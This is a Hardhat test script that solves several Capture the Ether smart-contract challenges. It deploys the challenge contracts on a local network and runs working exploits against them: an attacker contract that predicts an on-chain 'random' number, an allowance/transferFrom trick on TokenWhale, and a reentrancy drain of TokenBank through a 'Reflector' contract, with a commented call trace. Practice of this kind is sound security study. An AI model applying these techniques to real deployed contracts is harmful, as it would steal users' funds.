import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers, tracer } from "hardhat";
import fs from 'fs'
import { ethers as het } from "hardhat";

let one_eth = ethers.utils.parseEther('1.0')
let signer: any
const eut = ethers.utils
const BigNumber = ethers.BigNumber

async function step(desc: string, promise: Promise<any>) {
	console.log('\x1B[1;32m', desc, '\x1B[0m : ') 
	let res = await promise
	console.log('   # ', res.hash)
	// auto-wait on transactions
	if (res.wait) {
		res = await res.wait()
		console.log('   > ', res)
		if (res.status != 1) throw new Error('tx failed tho')
	}
	console.log('   > ', res)
	return res
}

async function attackNewNumber() {
	tracer.enabled = false
	/*
	let target = new ethers.Contract(
		'0xfd4Aa751C7083F444eBF07822a3Ad98a97c40Cba',
		[
			'function guess(uint8 n) public payable',
            'function isComplete() public view returns (bool)' 
        ], signer                          
    )                                      
    */                                     
    let targetFactory = await ethers.getContractFactory('GuessTheNewNumberChallenge')
    let target = await targetFactory.deploy({ value: one_eth })
    let attackFactory = await ethers.getContractFactory('AttackNewNumber')
    let attack = await attackFactory.deploy(target.address)
    //let attack = attackFactory.attach('0xA25b90b7Ee6BaB71e25F80cd75CF7EAAF02Bc2E8')
    console.log('attecker deployed at ', attack.address)
    console.log('target bal before attack: ', 
                await ethers.provider.getBalance(target.address))
    tracer.enabled = true                  
    let tx = await attack.attempt(31, { gasLimit: 150_000, value: one_eth })
    console.log(tx)                        
    return target                          
}                                          

async function tokenWhaleChallenge() {
	let factory = await ethers.getContractFactory('TokenWhaleChallenge')
	let target = await factory.deploy(signer.address)

	let friend = (await ethers.getSigners())[1]
	console.log('friend (pls fund): ', friend.address, ' balance ', await ethers.provider.getBalance(friend.address))
	if ((await ethers.provider.getBalance(friend.address)).isZero()) {
		await signer.sendTransaction({ to: friend.address, value: one_eth.mul(2) })
	}


	// allowance : victim -> spender -> amount
	await target.connect(signer)
			   .approve(
				   friend.address,
                   ethers.BigNumber.from('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'))
    await target.connect(friend)   
               .transferFrom(           
                   signer.address,      
                   ethers.utils.getAddress('0x00000000000000000000000000a8f00d125b4fee'),
                   1000,             
				   { gasLimit: 200_000 })

    return target                                 
}                                                 

async function tokenBank() {
	let deployer = (await ethers.getSigners())[1]
	let bankArtifact = JSON.parse(
		fs.readFileSync('artifacts.cross/TokenBankChallenge.sol/TokenBankChallenge.json').toString()
	)
	let bankFactory = new ethers.ContractFactory(bankArtifact.abi, bankArtifact.bytecode, deployer)
	let bank = await bankFactory.deploy(signer.address)

	// bank
	/*
	let bank = new ethers.Contract(
		'0x34888dA7DD355D3051B290FEaEB6AAf4957a028E',
		[
			'function isComplete() public view returns (bool)',
			'function token() public view returns (address)',
			'function balanceOf(address who) public view returns (uint256)',
			'function withdraw(uint256 amount) public'
		], signer
	)
	*/

	let token = new ethers.Contract(
		await bank.token(),
		[
			'function transfer(address to, uint256 value) public returns (bool success)',
			'function transferFrom(address from, address to, uint256 value)',
			'function balanceOf(address who) public view returns (uint256)',
			'function approve(address spender, uint256 value)'
		], signer
	)

	let player = signer
	let factory = await het.getContractFactory('Reflector')
	let reflector = await factory.deploy(bank.address, token.address)
	//let reflector = factory.attach('0x9b75c90497a638012Ea6c9895D603Ca441618b2a')
	let one = BigNumber.from(10).pow(18)
	console.log('reflecctor', reflector.address)
                                                  
    await step('1. player withdraw', bank.connect(player).withdraw(one.mul(250_000)))
    await step('2. transfer to reflector', token.connect(player).transfer(reflector.address, one.mul(250_000)))
                                                     
    await step('3. reflector deposits to bank', reflector.runTransfer(bank.address, one.mul(250_000)))
	await step('4. reflector withdraw', reflector.runWithdraw({ gasLimit: 500_000 }))
	await step('5. drain the bank', reflector.runDrain(one.mul(500_000)))
    console.log({                                    
        bank_player: await bank.balanceOf(player.address),
        bank_reflector: await bank.balanceOf(reflector.address),
		bank_owner: await bank.balanceOf('0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee'),
		token_reflector: await token.balanceOf(reflector.address),
		token_player: await token.balanceOf(player.address),
		token_bank: await token.balanceOf(bank.address)
	})

	//	0. bank deployed
	//		token deployed
	//			token.balanceOf[bank] = 1 000 000
	//	1. player --> bank.withdraw(250 000)
	//		bank --> token.transfer(player, ...)
	//	2. player --> token.transfer(reflector, ...)
	//		token --> reflector.tokenFallback(...)
	//			reflector --> token.transfer(bank, ...)
	//	3. reflector --> token.transfer(bank, ...)
	//	4. reflector --> bank.withdraw(250 000)
	//		bank --> token.transfer(bank, reflector, ...)
	//			token --> reflector.tokenFallback(...)
	//				reflector --> bank.withdraw(250 000)
	//					bank --> token.transfer(...)

}

describe("Lock", function () {
	it('does', async()=>{
		signer = (await ethers.getSigners())[0]
		await tokenBank()
	})
});
